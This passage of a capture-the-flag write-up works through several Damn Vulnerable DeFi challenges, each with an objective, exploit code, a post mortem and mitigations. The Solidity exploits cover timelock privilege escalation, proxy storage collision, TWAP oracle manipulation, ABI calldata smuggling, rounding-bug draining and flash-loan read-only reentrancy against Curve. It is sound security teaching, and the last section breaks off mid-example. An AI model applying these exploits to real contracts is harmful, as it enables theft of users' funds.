    - `updateDelay(0)` on the timelock to set the delay to zero.
    -  `transferOwnership(address(this))` to set ourselves as owner of the vault so we can call `upgradeToAndCall()`
    - `schedule(targets, values, dataElements, salt)` on the timelock to register the very same operations listed above.
2. Submit the batched operation to `ClimberTimelock.execute(...)`. The timelock will iterate and perform each call, ultimately transferring ownership to us
3. Call `vault.upgradeToAndCall()` to a malicious implementation we deployed in-advance and withdraw all funds to the recovery account.

```solidity
contract Recover {
    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;
    address recoveryAddress;

    address[] targets = new address[](4);
    uint256[] values = new uint256[](4);
    bytes[] dataElements = new bytes[](4);

    constructor(
        address vaultAddress,
        address timelockAddress,
        address tokenAddress,
        address recoveryAddress_
    ) {
        vault = ClimberVault(vaultAddress);
        timelock = ClimberTimelock(payable(timelockAddress));
        token = DamnValuableToken(tokenAddress);
        recoveryAddress = recoveryAddress_;

        targets[0] = address(timelock);
        dataElements[0] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            keccak256("PROPOSER_ROLE"),
            address(this)
        );

        targets[1] = address(timelock);
        dataElements[1] = abi.encodeWithSignature(
            "updateDelay(uint64)",
            uint64(0)
        );

        targets[2] = address(vault);
        dataElements[2] = abi.encodeWithSignature(
            "transferOwnership(address)",
            address(this)
        );

        targets[3] = address(this);
        dataElements[3] = abi.encodeWithSignature("scheduleTimelock()");

        for (uint256 i = 0; i < 4; i++) {
            values[i] = 0;
        }
    }

    function scheduleTimelock() external {
        timelock.schedule(
            targets,
            values,
            dataElements,
            bytes32(0)
        );
    }

    function recover() external {
        //create 4 operations for the timelock to execute
        timelock.execute(
            targets,
            values,
            dataElements,
            bytes32(0)
        );

        address maliciousVault = address(new MaliciousVault());
        vault.upgradeToAndCall(maliciousVault, abi.encodeWithSignature("withdrawAll(address,address)", address(token), recoveryAddress));
    }
}

contract MaliciousVault is ClimberVault {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    function withdrawAll(address token, address recoveryAddress) external {
        SafeTransferLib.safeTransfer(token, recoveryAddress, IERC20(token).balanceOf(address(this)));
    }
}

function test_climber() public checkSolvedByPlayer {
    Recover recover = new Recover(
        address(vault),
        address(timelock),
        address(token),
        recovery
    );

    recover.recover();
}
```

### Post Mortem
- The main problem is because `ClimberTimelock.execute` performs the batched external calls before verifying that the operation is `ReadyForExecution`. 
```solidity
//Code Snippet of ClimberTimeLock.execute function
for (uint8 i = 0; i < targets.length; ++i) {
    targets[i].functionCallWithValue(dataElements[i], values[i]);
}

if (getOperationState(id) != OperationState.ReadyForExecution) {
    revert NotReadyForExecution(id);
}
```
Such ordering allows the us to perform a `grantRole()` function first and grant ourselves the `PROPOSER_ROLE` and set delay to 0 and end with a `schedule()` to register all the performed actions before it is checked. As a result, we were able to sneak a `transferOwnership` in between and gain control of the vault.
- Since we are the vault owner, we can call `upgradeToAndCall` on the vault. And have it point to any contract we want. In this case we pre-deployed a malicious contract to recover all funds.

### Mitigation
Always follow the check-effect-interaction rule. Never allow low-level calls to be made before checking whether the operation is a valid one. 

## 13. Wallet Mining
### Objective
Recover the 20,000,000 DVT preloaded at the predetermined deposit address by materializing the missing Safe wallet there, then deliver those tokens to the intended user and pay the ward with the wallet-deployer reward

### Contracts
- `WalletDeployer.sol`: Gnosis Safe deployer that rewards callers with `pay` in DVT per successful `drop` and optionally gates deployments via an external authorizer.
- `AuthorizerUpgradeable.sol` and `TransparentProxy.sol`: Proxy-based authorizer holding a `(ward → aim)` allowlist; the proxy has a dedicated upgrader separate from the admin.
- `CreateX.sol` (test helper): a deterministic `deployCreate2(bytes32,bytes)` helper (CreateX) used by the test harness to deploy contracts at predictable addresses via signed/raw transactions.
- `SafeSingletonFactory` (test artifact): pre-deployment data and runtime code for a minimal Safe singleton factory; the test broadcasts a raw signed tx to ensure the factory and a Safe copy exist at well-known addresses.
- `AuthorizerFactory.sol`: small factory that deploys a proxied `AuthorizerUpgradeable` instance (via `TransparentProxy`) and configures its `upgrader`; used to create the authorizer instance wired into `WalletDeployer`.

### Solution 
In this Challenge, there is a two-part solution. The first is to find the missing Nonce. The second is to find the vulnerability in the wallet deployer and rescue the fund. 
1. **Recover the missing Safe nonce:** brute-force the `createProxyWithNonce` parameter until the derived proxy address equals `USER_DEPOSIT_ADDRESS` (in this instance, the nonce is `13`).
```solidity
address[] memory owners = new address[](1);
owners[0] = _user;
initializer = abi.encodeWithSignature(
    "setup(address[],uint256,address,bytes,address,address,uint256,address)",
    owners,
    1,
    address(0),
    "",
    address(0),
    address(0),
    0,
    payable(address(0))
);   
while (true) {
    bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), targetNonce));
    bytes memory initCode = abi.encodePacked(
        type(SafeProxy).creationCode,
        uint256(uint160(singletonCopy))
    );
    bytes32 hash = keccak256(
        abi.encodePacked(bytes1(0xff), proxyFactory, salt, keccak256(initCode))
    );
    address derivedAddress = address(uint160(uint256(hash)));
    if (derivedAddress == USER_DEPOSIT_ADDRESS) {
        break;
    }
    targetNonce++;
}
```
The above code is what I used to find the target nonce. However, if performed in contract, it will cost a lot of gas, therefore, in `Recover.sol` I commented it as we do not need to find target nonce within transaction call. We can pre-compute it and use `nonce = 13`. The commented section is for solution reference only.
2. **Exploit the authorizer and rescue all funds:** 
    - call `AuthorizerUpgradeable.init(...)` again and whitelist ourselves as wards.
    - call `walletDeployer.drop()` to deploy the above computed Safe Wallet.
    - Use given private key to transfer the 20 Million DVT to the designated user.
    - Lastly, transfer the 1 DVT reward for deploying wallet to the designated original ward. 
```solidity
function recover(bytes memory signatures) public{
    address [] memory _wards = new address[](1);
    _wards[0] = address(this);
    address[] memory aims = new address[](1);
    aims[0] = USER_DEPOSIT_ADDRESS;
    authorizer.init(_wards, aims);
    walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, targetNonce);
    Safe(payable(USER_DEPOSIT_ADDRESS)).execTransaction(address(token), 0, abi.encodeCall(token.transfer, (user, 20_000_000e18)), 
                                Enum.Operation.Call, 50000, 0, 0, address(0), payable(0), signatures);
    token.transfer(ward, 1 ether);
}

function test_walletMining() public checkSolvedByPlayer {
    bytes32 DOMAIN_SEPARATOR = keccak256(abi.encode(bytes32(0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218), block.chainid, USER_DEPOSIT_ADDRESS));
    bytes memory txHashData = abi.encodePacked(bytes1(0x19), bytes1(0x01), DOMAIN_SEPARATOR, keccak256(abi.encode(bytes32(0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8), address(token), 0, keccak256(abi.encodeCall(token.transfer, (user, 20_000_000e18))), 
                                Enum.Operation.Call, 50000, 0, 0, address(0), payable(0), 0)));
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, keccak256(txHashData));
    bytes memory signatures = abi.encodePacked(r, s, v);
    Recover recover = new Recover(
        ward, 
        user, 
        userPrivateKey, 
        address(authorizer), 
        address(singletonCopy), 
        address(proxyFactory),
        address(walletDeployer), 
        address(token), 
        signatures
    );
}
```

### Post Mortem
The main vulnerability of the challenge presented is storage collision on the proxy and proxy implementation.
`TransparentProxy` keeps an `upgrader` variable in storage slot 0, while `AuthorizerUpgradeable` keeps its `needsInit` flag in storage slot 0. Since the proxy uses `delegatecall`, the implementation reads/writes the proxy’s storage. That means `needsInit` effectively becomes “whatever `upgrader` is”. 

```solidity
//AuthorizeFactory.deployWithProxy() code snippet
assert(AuthorizerUpgradeable(authorizer).needsInit() == 0); // invariant
TransparentProxy(payable(authorizer)).setUpgrader(upgrader);

//Contract AuthorizerUpgradeable code snippet
contract AuthorizerUpgradeable {
    uint256 public needsInit = 1;

    constructor() {
        needsInit = 0; // freeze implementation
    }

    function init(address[] memory _wards, address[] memory _aims) external {
        require(needsInit != 0, "cannot init");
        for (uint256 i = 0; i < _wards.length; i++) {
            _rely(_wards[i], _aims[i]);
        }
        needsInit = 0;
    }
}

//Contract Transparent Proxy code Snippet
contract TransparentProxy is ERC1967Proxy {
    address public upgrader = msg.sender;

     function setUpgrader(address who) external {
        require(msg.sender == ERC1967Utils.getAdmin(), "!admin");
        upgrader = who;
    }
}
```

Although in the constructor of AuthorizeUpgradeable implementation contract sets `needsInit = 0` which in theory blocks the contract from calling `init()`, the Authorize factory during deployment calls the Transparent Proxy `setUpgrader()` which overwrites the `needsInit` with the address upgrader to a non-zero value. Therefore, any one can call `init()` again.


### Mitigation
- Use a standard proxy implementation (EIP-1967/OZ) and avoid defining regular Solidity state variables in the proxy that can collide with the implementation.
- Use a robust initializer guard (e.g., OZ `Initializable`) where the initialization state lives in a dedicated storage slot and cannot be “revived” by unrelated writes.

## 14. Puppet V3
### Objective
Rescue all the funds from `PuppteV3Pool.sol` and transfer to the designated recovery account. The new PuppetV3 Pool uses a new and improved oracle compared to Puppet and PuppetV2. It directly interacts with UniswapV3 protocol.

### Contracts
- `PuppetV3Pool.sol` — lending pool that uses a Uniswap V3 TWAP (via `OracleLibrary`) to compute WETH-per-DVT and requires `DEPOSIT_FACTOR` × quoted WETH as collateral.
- `OracleLibrary.sol` — computes time-weighted average tick from a `IUniswapV3Pool` and converts ticks to token quotes.
- `IUniswapV3Pool` / Uniswap V3 pool & position manager — the AMM whose concentrated liquidity and ranges determine slippage and price impact.

### Solution
1. Swap a large amount of DVT for WETH on the Uniswap V3 pool so the pool's current tick moves beyond the minted position's range (`tickLower` = -60, `tickUpper` = +60). After crossing the edge of the concentrated range, available active liquidity drops and subsequent swaps move price (tick) with very little resistance.
2. Advance block time so the manipulated (collapsed) tick persists for the majority of the TWAP window used by the pool (the challenge uses a 10-minute TWAP). In test harnesses this is done by warping the timestamp forward (+114s to maximise price manipulation) so the manipulated tick dominates the arithmetic mean over the oracle window.
3. Call `OracleLibrary.getQuoteAtTick` with that manipulated TWAP tick to obtain a tiny WETH-per-DVT quote; multiply by `DEPOSIT_FACTOR` to get the required collateral — this collapses to a negligible WETH amount 
4. Convert ETH to WETH, approve & deposit the minimal WETH collateral, call `PuppetV3Pool.borrow(...)` for the pool's full DVT balance (e.g., 1,000,000 DVT), and transfer tokens to the recovery address.
```solidity
function test_puppetV3() public checkSolvedByPlayer {
    //from mainnet
    ISwapRouter router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    token.approve(address(router), PLAYER_INITIAL_TOKEN_BALANCE);
    router.exactInputSingle(
        ISwapRouter.ExactInputSingleParams({
            tokenIn: address(token),
            tokenOut: address(weth),
            fee: FEE,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        })
    );

    vm.warp(block.timestamp + 114 seconds);
    uint256 wethRequired = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
    weth.deposit{value: wethRequired}();
    weth.approve(address(lendingPool), wethRequired);
    lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
    token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
}
```
### Post Mortem
- Although this challenge adopts an improved Uniswap V3 TWAP-based oracle compared to earlier Puppet variants, the design still exhibits security limitations.
- The oracle reports a time-weighted average price (TWAP) rather than an instantaneous spot rate, which reduces sensitivity to short-lived spikes. However, the configured TWAP window is only 10 minutes — short enough to be economically manipulable in low-liquidity pools.
- Reliance on a single price source creates a single point of failure: if that pool or oracle is manipulated or compromised, all derived prices become unreliable.
- The pool's initial liquidity is shallow (100 WETH / 100 DVT), so large swaps or flash loans can exhaust concentrated ranges and produce extreme price movements with relatively little capital.

### Mitigation
- Use multiple oracle sources (On-chain & Off-chain). Or simply just use Chainlink.
- Do not initiate pool with such low liquidity.

## 15. ABI Smuggling

### Objective
Rescue all funds in the `SelfAuthorizedVault.sol` by manipulating the ABI vulnerability

### Contracts
- `AuthorizedExecutor.sol`: Base contract of `SelfAuthorizedVault.sol` which holds the contract logic and function for the `setPermissions()` and `execute()` functions.
- `SelfAuthorizedVault`: The deployable contract of the vault which allows users to call `withdraw()` or authorized users to call `sweepFunds()`

### Solution
- Craft a single low-level calldata payload that calls `execute()` on the vault. The calldata will have a custom actionData offset and the withdraw function selector on the 100th byte to bypass the `execute()` function conditional checking.
`execute selector (4 bytes)`

Calldata crafted as follow:

| Offset | Description |
|-------:|------------|
| [0] | execute selector (4 bytes): Top-level selector for execute(address,bytes). |
| [4] | target (32 bytes): ABI-encoded address(vault) (left-padded to 32 bytes). This is the first (static) argument to execute. |
| [36] | data offset (32 bytes): ABI offset (here encoded as 0x80) pointing—relative to the start of the parameters block (immediately after the 4‑byte selector)—to where the dynamic actionData encoding begins (the length word for actionData). |
| [68] | empty bytes word (32 bytes): Filler word (uint256(0)) placed between the head and where the executor reads the "permission" selector; serves as layout padding. |
| [100] | fake/allowed selector word (32 bytes): 32-byte word whose first 4 bytes are the withdraw selector and the rest padded. AuthorizedExecutor.execute reads the 4-byte selector from this exact position (it does calldataload at offset 4 + 32*3) to perform the permission check. |
| [132] | actionData length (32 bytes): ABI uint256 length of the forthcoming actionData (the dynamic bytes blob). The earlier data offset points to this word. |
| [164] | actionData (variable length): The actual bytes executed by AuthorizedExecutor.execute (here: abi.encodeWithSelector(sweepFunds.selector, recovery, token)). Format: 4-byte selector followed by encoded arguments; this is the payload the vault ultimately runs. |

```solidity
function test_abiSmuggling() public checkSolvedByPlayer {
        bytes4 executeSelector = vault.execute.selector;
        bytes memory target = abi.encodePacked(bytes12(0), address(vault));
        bytes memory dataOffset = abi.encodePacked(uint256(0x80));
        bytes memory emptyData = abi.encodePacked(uint256(0));

        bytes memory withdrawSelector= abi.encodePacked(
            bytes4(0xd9caed12),
            bytes28(0)
        );

        bytes memory actionData = abi.encodeWithSelector(
            vault.sweepFunds.selector,
            recovery,
            token
        );

        bytes memory actionDataLength = abi.encodePacked(uint256(actionData.length));

        bytes memory calldataPayload = abi.encodePacked(
            executeSelector, //4 bytes function seletor
            target, //32 bytes target address padded
            dataOffset, //32 Bytes data offset points to 0x80
            emptyData, //Empty bytes 
            withdrawSelector, //withdraw function selector to mislead execute function
            actionDataLength, //The start of the offset, length of actionData 
            actionData //The start of actionData (4th line)
        );

        address(vault).call(calldataPayload);
    }
```

### Post Mortem
- Root cause: `AuthorizedExecutor.execute` reads a 4-byte selector out of calldata at a fixed offset and uses that value for permission checks, but it does not ensure that the selector it reads is the same selector present at the start of the `actionData` blob that it later executes. An attacker can therefore place an allowed selector where the executor reads it while pointing the `data` pointer to a different payload entirely.

As a result, an attacker with permission for a harmless selector can trick the vault into running a more powerful action (here `sweepFunds`) and drain all tokens.

### Mitigation
- Verify the selector inside the actual `actionData`. parse or decode `actionData` and use `bytes4(actionData[:4])` as the authoritative selector for permission lookups.
- Avoid relying on fixed, hard-coded calldata offsets — use ABI decoding (`abi.decode`) on the incoming `bytes` argument to extract and validate parameters and selectors.

## 16. Shards

### Objective
Rescue as much funds as possible from the `ShardsNFTMarketplace.sol` to the recovery account and complete the whole process in a single transaction.

### Contracts
- `DamnValuableStaking.sol `:
- `ShardsNFTMarketplace.sol`:
- `ShardsFeeVault.sol`:
    - `DamnValuableStaking.sol`: ERC20-based staking contract that accepts DVT deposits, mints staked representation (stDVT), tracks per-account reward accrual over time, and allows claiming/withdrawing of staked tokens plus earned rewards.
    - `ShardsNFTMarketplace.sol`: On-chain marketplace that lets sellers offer an NFT split into ERC1155 "shards". Buyers purchase shards with DVT, purchases can be cancelled within a window, sellers receive payments net of marketplace fees, and the contract coordinates minting/burning of shard tokens.
    - `ShardsFeeVault.sol`: Permissioned fee vault (deployed as a clone) that holds marketplace fees in DVT, can optionally forward deposited fees into the staking contract, and allows the vault owner to withdraw accumulated fees and staking proceeds.

### Solution
Call `fill()` for a minimal amount of shards then immediately call `cancel()` to redeem a larger amount of tokens by manipulating the rounding bug error. Calculations of how to maximize the rounding bug and how many iterations required for completing the test is done in the post mortem section.
```solidity
contract Recover {
    DamnValuableToken token;
    ShardsNFTMarketplace marketplace;
    address recovery;

    constructor(
        address _token,
        address _marketplace,
        address _recovery
    ) {
        token = DamnValuableToken(_token);
        marketplace = ShardsNFTMarketplace(_marketplace);
        recovery = _recovery;
    }

    function recover() public {
        for(uint256 i = 0; i <= 7518; i++) {
            marketplace.fill(1, 133);
            marketplace.cancel(1, i);
        }

        token.transfer(recovery, token.balanceOf(address(this)));
    }
}
```
### Post Mortem
The marketplace computes the buyer payment using `A0 = floor(P*r/scale)` and `mulDivDown` but refunds using `r` and `mulDivUp`. The mismatch causes a Rounding Bug and allows attackers to buy small shard quantities for zero payment and receive huge refunds.

```solidity
function fill(){
    ...
    paymentToken.transferFrom(
        msg.sender, address(this), want.mulDivDown(_toDVT(offer.price, _currentRate), offer.totalShards)
    );
}

function cancel(){
    ...
    paymentToken.transfer(buyer, purchase.shards.mulDivUp(purchase.rate, 1e6));
}
```

- Constants used in the test:
    - `P` = `NFT_OFFER_PRICE` = 1_000_000e6 = 1e12
    - `r` = `MARKETPLACE_INITIAL_RATE` = 75e15 = 7.5e16
    - `scale` = 1e6 (used by `_toDVT`)
    - `T` = `NFT_OFFER_SHARDS` = 10_000_000e18 = 1e25

- Contract computations (exact):
    - `A0 = _toDVT(P, r) = floor(P * r / scale)` = floor(7.5e22) = 7.5e22
    - `Paid(w)` (what buyer pays in `fill`) = floor( w * A0 / T ) = floor(w * 0.0075)
    - `Refund(w)` (what buyer gets on `cancel`) = ceil( w * r / scale ) = w * 75_000_000_000

- Zero-paid threshold (no upfront payment):
    - `Paid(w) = 0` while w * A0 < T ⇒ w ≤ floor((T−1)/A0) = 133
    - So any purchase of up to `133` shards costs `0` DVT but refunds `w * 75_000_000_000` when cancelled.

- Example numbers:
    - `w = 1`: Paid = 0, Refund = 75_000_000_000 → net gain = 75_000_000_000 DVT
    - `w = 133`: Paid = 0, Refund = 9_975_000_000_000 → net gain = 9_975_000_000_000 DVT
    - `w = 134`: Paid = 1, Refund = 10_050_000_000_000 → net gain = 10_049_999_999_999 DVT

- Maximise per-iteration extraction by buying the largest `w` with `Paid(w)=0` (here `w=133`) and cancelling to collect `Refund(w)`. Repeat within transaction(s) until marketplace balance is drained or stock exhausted. You will actually need ~75 million iterations to save all funds which will not be achieved with gas limits. However, the test only requires us to save 7.5e16 tokens. Therefore the minimal iterations required to pass the test is 7518.

There is also another problem with the marketplace which allowed the attack to become possible. 

As setup in the marketplace, users should only be allowed to call function cancel within the time period: 1 day after calling fill and before 2 days after calling fill 
```solidity
/// @notice how much time buyers must wait before they can cancel
    uint32 public constant TIME_BEFORE_CANCEL = 1 days;

    /// @notice for how long can buyers cancel
    uint32 public constant CANCEL_PERIOD_LENGTH = 2 days;
```

However, in `cancel()`, the time condition checking is wrongly set to effectively only allowing users to call `cancel()` within 1 day of calling `fill()`

```solidity
if (
    purchase.timestamp + CANCEL_PERIOD_LENGTH < block.timestamp
        || block.timestamp > purchase.timestamp + TIME_BEFORE_CANCEL
) revert BadTime();

//It should be: 
block.timestap < purchase.timestamp + TIME_BEFORE_CANCEL revert
```

Therefore, we can call fill and cancel back to back without restrictions.

### Mitigation

- Store the actual `amountPaid` for each `Purchase` at `fill()` time and refund at most that stored amount on `cancel()` (avoid recomputing using live `rate`).
- Align rounding semantics: compute refunds using the same fixed-point formula and rounding direction used to charge buyers (or use integer accounting with stored totals).
- Fix the cancel time-window check to enforce: `block.timestamp >= purchase.timestamp + TIME_BEFORE_CANCEL && block.timestamp <= purchase.timestamp + TIME_BEFORE_CANCEL + CANCEL_PERIOD_LENGTH`.

## 17. Curvy Puppet
### Objective
Manipulate the oracle price so that you can liquidate all users that deposited in the lending pool and recover all funds to. designated treasury account

### Contracts
- `CurvyPuppetLending.sol`: The main contract for interaction which allows users to deposit and withdraw DVT as collateral. Collateral can be used to borrow LP tokens from the stETH/ETH Curve Pool.
- `CurvyPuppetOracle.sol`: Oracle contract for pricing used in the `CurvyPuppetLending.sol`. 
- `ICryptoSwapPool.sol`: Basic interface contract for interacting with Curve Pool 

### Solution 
This is easily the hardest challenge from all of the previous ones.

1. Deploy Recover.sol and ensure Recover contract has enough DVT/WETH to perform swaps (via an initial transfer or flashloan). 
2. Call AaveV2 Flashloan and use the callback to call Balancer Flash loan. Only by using two flashloans do we have enough liquidity to perform price manipulation.
3. Manipulate Curve pool price by adding liquidity then instantly removes liquidity.
4. Force oracle to observe the manipulated state during receive ETH callback. At this state, their is a read-only reentrancy vulnerability.
5. Liquidate all users during this state and retrieve all funds.
6. Revert all necessary tokens to repay the previous 2 flash loans.
7. Transfer funds to treasury address.

```solidity
contract Recover {
    IERC20 lpToken;
    IERC20 stETH;
    WETH weth;
    DamnValuableToken dvt;
    IStableSwap curvePool;
    CurvyPuppetLending lending;
    IPermit2 permit2;
    address treasury;
    address[3] users;

    IAaveFlashloan AaveV2 = IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    constructor(
        IERC20 _lpToken,
        IERC20 _stETH,
        WETH _weth,
        DamnValuableToken _dvt,
        IStableSwap _curvePool,
        CurvyPuppetLending _lending,
        IPermit2 _permit2,
        address _treasury,
        address[3] memory _users
    ) {
        lpToken = _lpToken;
        stETH = _stETH;
        weth = _weth;
        dvt = _dvt;
        curvePool = _curvePool;
        lending = _lending;
        permit2 = _permit2;
        treasury = _treasury;
        for (uint256 i = 0; i < 3; i++) {
            users[i] = _users[i];
        }
    }

    function recover() external {
        //call flashloan from Aave V2
        stETH.approve(address(AaveV2), 172000 * 1e18 * 1.0009);
        weth.approve(address(AaveV2), 20500 * 1e18 * 1.0009);

        address[] memory assets = new address[](2);
        assets[0] = address(stETH);
        assets[1] = address(weth);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 172000 * 1e18;
        amounts[1] = 20500 * 1e18;
        uint256[] memory modes = new uint256[](2);
        modes[0] = 0;
        modes[1] = 0;
 
        AaveV2.flashLoan(address(this), assets, amounts, modes, address(this), bytes(""), 0);

        // Transfer all recovered assets to treasury
        weth.transfer(treasury, weth.balanceOf(address(this)));
        lpToken.transfer(treasury, 1);
        dvt.transfer(treasury, 7500e18);
    }

    function executeOperation(
        address[] memory assets,
        uint256[] memory amounts,
        uint256[] memory premiums,
        address initiator,
        bytes memory params
    ) external returns (bool) {     
        //AaveV2 Flashloan callback logic
        //Call Balancer flashloan
        address[] memory tokens = new address[](1);
        tokens[0] = address(weth);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 37991 ether;
        bytes memory userData = "";
        Balancer.flashLoan(address(this), tokens, amounts, userData);
        return true;
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        //Balancer Flashloan callback logic
        lpToken.approve(address(permit2), type(uint256).max);
 
        permit2.approve({
            token: curvePool.lp_token(),
            spender: address(lending),
            amount: 5e18,
            expiration: uint48(block.timestamp)
        });

        // 1. Manipulate Curve Pool by adding Liquidity
        weth.withdraw(58685 ether);
        stETH.approve(address(curvePool),stETH.balanceOf(address(this)));

        uint256[2] memory amount;
        amount[0] = 58685 ether;
        amount[1] = stETH.balanceOf(address(this));
        curvePool.add_liquidity{value: 58685 ether}(amount, 0); 

        //2. Remove liquidity from Curve Pool to get LP tokens and cause read-only reentrancy 
        uint256 lpBalance = lpToken.balanceOf(address(this));
        lpToken.approve(address(curvePool), lpBalance);
        curvePool.remove_liquidity(lpBalance - 3000000000000000001, [uint256(0), uint256(0)]);

        // 3.Start to revert tokens
        weth.deposit{value: 37991 ether}();
        weth.transfer(address(Balancer), 37991 ether);

        uint256 ethAmount = 12963923469069977697655;
        uint256 min_dy = 1; 
        curvePool.exchange{value: ethAmount}(0, 1, ethAmount, min_dy);
        weth.deposit{value: 20518 ether}();
    }

    receive() external payable {
        // Detect reentrancy during remove liquidity
        // On receive ETH logic, liquidate all users
        if (msg.sender == address(curvePool)) {
            for (uint256 i = 0; i < 3; i++) {
                lending.liquidate(users[i]);
            }
        }
    }
}
```

### Post Mortem
The DVT price is fixed at 10 DVT per ETH and the ETH price is fixed at 4000 for this test. By contrast, an LP token's value is derived from the pool's virtual price multiplied by the ETH price; the virtual price is calculated as the ratio of total liquidity to total LP supply.

When the pool's `remove_liquidity` flow performs the external ETH transfer before it completes internal accounting, the recipient's `receive()` callback executes while the pool's storage is temporarily inconsistent. If a liquidation is triggered from inside that callback, the LP supply may already have been reduced (burned) while the pool's total liquidity has not yet been decremented. This produces a transient increase in the virtual price:

$$
v = \frac{\text{total liquidity}}{\text{total LP supply}}
$$

Because the lending protocol values LP tokens as `virtual_price × ETH_price` (with ETH fixed at 4000 in the test), this spike inflates the LP token valuation and can make otherwise healthy loans appear undercollateralized, enabling liquidation. This attack is a form of **read-only reentrancy** (well-known for Curve Pool) and demonstrates why external transfers to user-controlled addresses must occur only after the contract's internal accounting is fully settled.

### Mitigation
- Use multiple independent price feeds (Chainlink + on-chain TWAP) and require quorum or sanity checks.
- follow check-effect-interaction pattern.

## 18. Withdrawal
### Objective
There is a token bridge to withdraw DVT from an L2 to L1. Anyone can finalize the withdrawals with a valid merkle proof and after the delay period of 7 days. Within the given log of withdrawal events, there is a malicious one. We have to find the suspicious withdrawal event and protect the bridge by finalizing all withdrawals (including the suspicious one, but not allowing it to successfully withdrawing).
### Contracts
### Contracts
- `L1Forwarder.sol`: a lightweight forwarder that relays authorized L1 transactions to the gateway, validating signatures/metadata for cross-chain messages.
- `L1Gateway.sol`: the L1 bridge gateway that coordinates withdrawal finalization, verifies Merkle proofs and delay windows, and manages custodial token transfers on L1.
- `L2Handler.sol`: the L2-side handler that emits withdrawal events and encodes L2 messages/roots used to build proofs for L1 finalization.
- `L2MessageStore.sol`: on-chain storage and bookkeeping for L2 withdrawal messages and Merkle roots used by the gateway to verify proofs.
### Solution
1. Understand the `withdrawal.json`
    ```json
    {
        "topics": [
            "0x43738d035e226f1ab25d294703b51025bde812317da73f87d849abbdbb6526f5",
            "0x0000000000000000000000000000000000000000000000000000000000000000",
            "0x00000000000000000000000087EAD3e78Ef9E26de92083b75a3b037aC2883E16",
            "0x000000000000000000000000fF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5"
        ],
        "data": "0xeaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba0000000000000000000000000000000000000000000000000000000066729b630000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000010401210a380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000000000000000000000000000008ac7230489e800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    },
    ```
    The above is an example of a single withdrawal event. The first argument in `topics` is actually the `L2MessageStore.MessageStored.selector`, and the three arguments that come after is `nonce`, `caller`, and `target`. In the `data` field, there are three arguments: `id`, `timestamp` and `data`, which can be decoded as
    ```
    Data bytes
    00-31      bytes: id
    32-63      bytes: timestamp
    64-95      bytes: data offset
    96-127     bytes: Length of data
    at Offset  bytes: Actual data
    ```
    The actual data itself is a bit more complicated. It is actually a data to call `L1Forwarder.forwardMessage(uint256 nonce, address l2Sender, address target, bytes memory message)`. Therefore, we have the following:
    ```
    Actual Data Bytes
    128-131    bytes: function selector of L1Forwarder.forwardMessage`
    131-162    bytes: nonce
    163-194    bytes: l2Sender
    195-226    bytes: target
    227-258    bytes: message offset
    259-290    bytes: Length of message
    at Offset  bytes: Actual Message
    ```
    Last but not least, the Actual message is the data to call `TokenBridge.executeTokenWithdrawal(address receiver, uint256 amount). Therefore, we have the following:
    ```
    Actual Message Bytes
    291-294    bytes: function selector of TokenBridge.executeTokenWithdrawal
    295-326    bytes: receiver
    327-358    bytes: amount
    ```

    The above is the fully decoded format of each withdrawal event in the json file. Lastly, lets use the above example as a demonstration:

    ```
    "topics": [
    //L2MessageStore.MessageStored.selector
    "0x43738d035e226f1ab25d294703b51025bde812317da73f87d849abbdbb6526f5", 
    //nonce
    "0x0000000000000000000000000000000000000000000000000000000000000000",
    //caller
    "0x00000000000000000000000087EAD3e78Ef9E26de92083b75a3b037aC2883E16",
    //target
    "0x000000000000000000000000fF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5"
    ],
    "data": 
    //id
    eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba
    timestamp
    0000000000000000000000000000000000000000000000000000000066729b63
    //data offset
    0000000000000000000000000000000000000000000000000000000000000060
    // data length
    0000000000000000000000000000000000000000000000000000000000000104
    //Start of data: 
    //L1Forwarder.forwardMessage.selector
    01210a38
    //nonce
    0000000000000000000000000000000000000000000000000000000000000000
    l2Sender
    000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac6
    //target
    0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd50
    //message offset
    0000000000000000000000000000000000000000000000000000000000000080
    //message length
    0000000000000000000000000000000000000000000000000000000000000044
    //TokenBridge.executeTokenWithdrawal.selector
    81191e51
    //receiver
    000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac6
    //amount
    0000000000000000000000000000000000000000000000008ac7230489e80000
    //padded zero
    0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    ```
